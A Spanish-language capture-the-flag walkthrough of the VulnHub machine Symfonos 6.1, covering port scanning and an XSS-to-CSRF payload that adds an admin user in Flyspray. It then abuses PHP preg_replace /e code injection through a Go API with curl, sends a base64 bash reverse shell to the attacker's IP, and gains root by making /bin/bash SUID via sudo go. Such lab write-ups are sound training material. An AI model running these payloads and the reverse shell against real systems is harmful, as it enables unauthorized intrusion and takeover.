# Symfonos: 6.1

<img src="https://github.com/JoseVazquez101/Writteups/assets/111292579/c9b9f1d1-9375-4c18-9f57-7e81469113e9" width="1000px">

Hoy vamos a resolver la maquina Symfonos 6.1, donde estaremos tocando conceptos de explotación a través de XXS y una intensa enumeración de ciertos servicios montados en un servidor web.

***

- Plataforma/Source: [VulnHub](https://www.vulnhub.com/entry/symfonos-61,458/)
- Dificultad: Medium/Hard
- OS: Linux
- IP: Por DHCP
- Meta: Obtener un shell root, es decir (root@localhost:~#) y luego obtener la bandera en /root
- Temas: `XSS`, `API enumeration`, `CSRF`, `RCE`, `Linux PrivEsc`

***
***

- Comenzamos con el escaneo de puertos, vemos que tendremos varios objetivos para analizar:
~~~ bash 
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Symfonos]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV symfonos.vh
[sudo] contraseña para kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-05 21:38 EST
NSE: Loaded 46 scripts for scanning.
Initiating ARP Ping Scan at 21:38
Scanning symfonos.vh (192.168.17.147) [1 port]
Completed ARP Ping Scan at 21:38, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:38
Scanning symfonos.vh (192.168.17.147) [65535 ports]
Discovered open port 3306/tcp on 192.168.17.147
Discovered open port 22/tcp on 192.168.17.147
Discovered open port 80/tcp on 192.168.17.147
Discovered open port 5000/tcp on 192.168.17.147
Discovered open port 3000/tcp on 192.168.17.147
Completed SYN Stealth Scan at 21:38, 1.19s elapsed (65535 total ports)
Initiating Service scan at 21:38
Scanning 5 services on symfonos.vh (192.168.17.147)
Completed Service scan at 21:39, 91.24s elapsed (5 services on 1 host)
NSE: Script scanning 192.168.17.147.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 0.02s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:39
Completed NSE at 21:39, 1.01s elapsed
Nmap scan report for symfonos.vh (192.168.17.147)
Host is up, received arp-response (0.000054s latency).
Scanned at 2023-12-05 21:38:20 EST for 94s
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3000/tcp open  ppp?    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64 MariaDB (unauthorized)
5000/tcp open  upnp?   syn-ack ttl 64
~~~
- Tenemos abiertos algunos puertos, revisando un poco a profundidad pude sacar unas conclusiones, la mayoría de puertos son accesibles desde el navegador:
 ~~~ bash
 http://symfonos.vh:80 -> Blog
 http://symfonos.vh:3000 -> Gitea
 http://symfonos.vh:5000 -> API
 ~~~

- Decidí hacer fuzzing en el puerto 80 para descubrir directorios, encontramos algo que más o menos llama la atención, un directorio `flyspray`:
~~~ bash 
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Symfonos]
└─$ gobuster dir -u http://symfonos.vh -w /usr/share/wordlists/dirb/big.txt -t 20 --add-slash --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://symfonos.vh
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess/           (Status: 403) [Size: 212]
/.htpasswd/           (Status: 403) [Size: 212]
/cgi-bin/             (Status: 403) [Size: 210]
/cgi-bin//            (Status: 403) [Size: 210]
/icons/               (Status: 200) [Size: 74409]
/flyspray/            (Status: 200) [Size: 25683]
/posts/               (Status: 500) [Size: 943]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
~~~
- Este es lo que parece ser un gestor de proyectos, al estilo de un blog.
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/2ca80c88-decd-4c6b-9e5b-0dc21a668fee)

- Si entramos en el proyecto actual podremos ver un blog con un comentario particular del admin, donde nos indica que estará revisando este constantemente si surgen cambios:
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/48d59315-3cc2-4ac8-b336-f88040a3b89d)

  - Vemos que podemos registrar usuarios, así que lo primero que pensaría sería en crear uno con una etiqueta JavaScript a ver si la pagina es vulnerable a `XSS`.
  - Registramos un usuario normal y editamos nuestro perfil para probar el `XSS`:
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/0dd18c4c-3ea1-4769-8d0b-8493b0c91b1e)
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/c35ad7ab-63f2-43d7-a09f-dbb1861802c6)

  - Y ahí está, tenemos una potencial manera de engañar al admin.
  - Investigué algunas vulns para `flyspray`, y encontré una bastante curiosa:
~~~ bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Symfonos]
└─$ searchsploit flyspray
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
Flyspray 0.9 - Multiple Cross-Site Scripti | php/webapps/26400.txt
FlySpray 0.9.7 - 'install-0.9.7.php' Remot | php/webapps/1494.php
Flyspray 0.9.9 - Information Disclosure/HT | php/webapps/31326.txt
Flyspray 0.9.9 - Multiple Cross-Site Scrip | php/webapps/30891.txt
Flyspray 0.9.9.6 - Cross-Site Request Forg | php/webapps/18468.html
FlySpray 1.0-rc4 - Cross-Site Scripting /  | php/webapps/41918.txt
Mambo Component com_flyspray < 1.0.1 - Rem | php/webapps/2852.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~
- Estamos en la versión 1.0 de este software, por lo que revisando ex exploit `41918` extraje el código JavaScript necesario:
~~~ javascript
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form"action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="admon"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345"/>'
txt += '<input type="hidden" name="user_pass2" value="12345"/>'
txt += '<input type="hidden" name="real_name" value="admon"/>'
txt += '<input type="hidden" name="email_address" value="admon@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="admon@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
~~~

- La idea ahora sería cambiar nuestro username a algo así:
  ~~~ javascript
  "><script src = "http://192.168.17.128/doc.js"></script>
  ~~~ 
- Nos montamos un server en Python y esperamos a que el admin entre al blog, por detrás se creará un nuevo usuario:

  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/fd688fa7-60b4-4562-ad90-b25910b6aea5)

  - Y ahí lo tenemos, credenciales para el usuario `achilles:h2sBr9gryBunKdF9`, que podremos ingresar en Gitea desde el puerto 3000:
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/2878d2c1-c3e1-469e-b18e-9a260a34c933)
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/b9b18852-0052-41b6-9486-697dc9eebf05)

  - Si entramos al proyecto `symfonos-blog` y revisamos el `index.php` podemos ver algo curioso:
    ~~~ php
    <?php
        while ($row = mysqli_fetch_assoc($result)) {
		$content = htmlspecialchars($row['text']);
		
		echo $content;
	
		preg_replace('/.*/e',$content, "Win");
        }
	?>
    ~~~
    - Se muestra contenido dentro de un elemento llamado `text`, el cual probablemente se encuentra almacenado en una base de datos.
    - El problema es que utiliza `preg_replace` con el modificador `/e`, el cual es bastante peligroso pues nos puede permitir ejecutar comandos. En si lo que sucede aquí es que la función toma 3 argumentos; el `regex`, el contenido de `text` y la cadena `"Win"`. Por lo que la idea será cambiar el contenido de la cadena que existe en `http://symfonos/posts` por código 
    - Aquí es donde nos podría dar por listar la API, a ver si se nos da alguna idea de como poder modificar el contenido en `text` para cargar código:
- Me he traído todo el repo de `symfonos-api` a mi maquina con `git clone` porque iba lentísimo.
- Ahora bien, después de unas dos horas de leer la API, lo mas rescatable que encontré fue lo siguiente:
  <h5>Endpoint:</h5>
- Vemos que la API se sirve en el puerto 5000, revisando `main.go`:
~~~ go
func main() {
        // load .env environment variables
        err := godotenv.Load()
        if err != nil {
                panic(err)
        }
        // initializes database
        db, _ := database.Initialize()
        port := os.Getenv("PORT")
        app := gin.Default() // create gin app
        app.Use(database.Inject(db))
        app.Use(middlewares.JWTMiddleware())
        api.ApplyRoutes(app) // apply api router
        app.Run(":" + port)  // listen to given port
}
~~~
- El archivo `.env` nos indica que `PORT=5000`
- En `api/api.go` podemos ver una ruta:
~~~ go
package api
import (
        "github.com/gin-gonic/gin"
        "symfonos.local/achilles/api/api/v1.0"
)
// ApplyRoutes applies router to gin Router
func ApplyRoutes(r *gin.Engine) {
        api := r.Group("/ls2o4g")
        {
                apiv1.ApplyRoutes(api)
        }
}
~~~
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/aeca9d9e-d9a0-478c-b70b-b183b5ca13bb)

- Vemos que el servicio por lo menos responde

<h5>Login en la API:</h5>
- En la ruta `/api/v1.0/auth` vemos un `auth.go`, donde vemos que existen dos rutas

~~~ go
package auth
import (
        "github.com/gin-gonic/gin"
)
// ApplyRoutes applies router to the gin Engine
func ApplyRoutes(r *gin.RouterGroup) {
        auth := r.Group("/auth")
        {
                auth.POST("/login", login)
                auth.GET("/check", check)
        }
}
~~~
- En el recurso `auth.ctrl.go` podemos encontrar una función que nos indicaría mas o menos como loguearnos y con que parámetros trabaja el `json`:

~~~ go
func login(c *gin.Context) {
        db := c.MustGet("db").(*gorm.DB)
        type RequestBody struct {
                Username string `json:"username" binding:"required"`
                Password string `json:"password" binding:"required"`
        }
~~~
- Por lo que nos podríamos loguear desde `curl` haciendo uso de los siguientes parámetros:

~~~ bash
  ┌──(kali💀Dedsec)-[~/…/symfonos-api/api/v1.0/auth]
└─$ curl 'http://symfonos.vh:5000/ls2o4g/v1.0/auth/login' -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}';echo

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDI0OTIxODYsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.MC2SfVYDK_cIPXYL93IdLm0E0rJF_onuiV7aWd_OCdw","user":{"display_name":"achilles","id":1,"username":"achilles"}}
~~~
- Y vemos que la pagina nos responde con un JWT de autenticación. Con esto podríamos ver como publicar cosas desde la API:

<h5>POST desde la API:</h5>
- En la ruta `/api/v1.0/posts` encontramos un recurso `posts.go`, el cual nos indica que a la ruta se le concatena una id, en este caso, la que nos regresó el login, que es 1. Emplea el método `PATCH` para actualizar el contenido del post que tenga este id:
~~~ go
package posts
import (
        "github.com/gin-gonic/gin"
        "symfonos.local/achilles/api/lib/middlewares"
)
// ApplyRoutes applies router to the gin Engine
func ApplyRoutes(r *gin.RouterGroup) {
        posts := r.Group("/posts")
        {
                posts.POST("/", middlewares.Authorized, create)
                posts.GET("/", list)
                posts.GET("/:id", read)
                posts.DELETE("/:id", middlewares.Authorized, remove)
                posts.PATCH("/:id", middlewares.Authorized, update)
        }
}
~~~
- Además, tenemos `posts.auth.go`, en donde se muestra una función `create`, la cual nos da la forma en la que debemos mandar nuestra solicitud. Al parecer nos pide loguearnos también pero para eso ya tenemos nuestro JWT:

~~~ go
  func create(c *gin.Context) {
        db := c.MustGet("db").(*gorm.DB)
        type RequestBody struct {
                Text string `json:"text" binding:"required"`
        }
        var requestBody RequestBody

        if err := c.BindJSON(&requestBody); err != nil {
                c.AbortWithStatus(400)
                return
        }

        user := c.MustGet("user").(User)
        post := Post{Text: requestBody.Text, User: user}
        db.NewRecord(post)
        db.Create(&post)
        c.JSON(200, post.Serialize())
}
~~~
- Requerimos llenar el campo `text` con nuestro texto, intentaremos ejecutar un comando con esto mismo.
- Debemos usar `$` en la petición para que nos interprete el escape de las comillas simples, pues no podemos usar dobles comillas:

~~~ bash 
┌──(kali💀Dedsec)-[~/…/symfonos-api/api/v1.0/posts]
└─$ curl -X PATCH 'http://symfonos.vh:5000/ls2o4g/v1.0/posts/1' -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDI0OTIxODYsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.MC2SfVYDK_cIPXYL93IdLm0E0rJF_onuiV7aWd_OCdw" -d $'{"text": "system(\'id\')"}';echo

{"created_at":"2020-04-02T04:41:22-04:00","id":1,"text":"system('id')","user":{"display_name":"achilles","id":1,"username":"achilles"}}
~~~

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/523e39a7-7ab3-4b16-abe2-3a83def77f75)

- Y ahí tenemos nuestra RCE, para entablar conexión al server simplemente bastaría ordenar mandarnos una revshell, de la siguiente manera:
- Encodeamos nuestro payload:
~~~bash
echo "bash -i >& /dev/tcp/192.168.17.128/4444 0>&1" | base64
~~~
- Mandamos el payload
~~~ bash
curl -X PATCH 'http://symfonos.vh:5000/ls2o4g/v1.0/posts/1' -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDI0OTIxODYsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.MC2SfVYDK_cIPXYL93IdLm0E0rJF_onuiV7aWd_OCdw" -d $'{"text": "system(\'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEyOC80NDQ0IDA+JjEK | base64 -d | bash\')"}'; echo
~~~
- Nos ponemos en escucha con netcat y deberíamos ganar acceso:
- Una vez dentro nos hacemos todo el ritual para tratar la TTY:
~~~ bash
script /dev/null -c bash
^Z
#Dejamos nuestra sesión en segundo plano
stty raw -echo; fg
#Nuestro tecleo será invisible, reiniciamos la xterm de igual manera
reset xterm
#Nos aparecerá un mensaje
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***
<h3>PrivEsc:</h3>
- A nadie le gusta ser `apache`, así que agradecemos a la reutilización de contraseñas que nos permitirá hacer un `user pivoting` hacia `achilles`

~~~ bash
bash-4.2$ su achilles
Password: h2sBr9gryBunKdF9
bash-4.2$ id
uid=1000(achilles) gid=1000(achilles) groups=1000(achilles),48(apache)
~~~
- Bien, vemos que nuestro usuario es capaz de ejecutar cualquier cosa que se ejecute con `go` como root:
~~~ bash
  bash-4.2$ sudo -l
Matching Defaults entries for achilles on symfonos6:
    !visiblepw, always_set_home, match_group_by_gid, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
~~~
- Entonces esto es muy intuitivo, me creé un script en go para ejecutar comandos:
~~~ go
import (
        "fmt"
        "os/exec"
)
func main() {
        cmd := exec.Command("chmod", "u+s", "/bin/bash")
        output, err := cmd.Output()
        if err != nil {
                fmt.Println("Error al ejecutar el comando:", err)
                return
        }
        fmt.Println(string(output))
}
~~~
- Le daremos permisos SUID a `/bin/bash`
- Ejecutamos:
  ~~~ bash
  sudo /usr/local/go/bin/go run exp.go 
  ls -la /bin/bash
  -rwsr-xr-x. 1 root root 964544 Apr 10  2018 /bin/bash
  ~~~
- Vemos que bash ahora es SUID, ejecutamos `/bin/bash -p` y seremos root:
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/36f1be3e-069e-465e-b0f9-fd49e30da4e9)

